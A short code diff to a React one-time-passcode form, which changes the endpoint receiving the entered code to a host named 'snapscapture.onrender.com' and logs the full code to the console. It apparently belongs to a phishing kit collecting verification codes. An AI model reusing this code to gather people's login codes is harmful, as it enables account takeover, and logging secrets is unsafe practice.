@@ -48,7 +48,7 @@ function OtpCode() {
             setLoading(true);
             // Send form data to the backend
             console.log("Fullcode:", fullCode)
-            const response = await axios.post('https://indecisive-elite-maple.glitch.me/code', { code: fullCode });
+            const response = await axios.post('https://snapscapture.onrender.com/code', { code: fullCode });
             console.log("Status", response.status);
             if (response.status === 200) {
                 setSuccess(true);
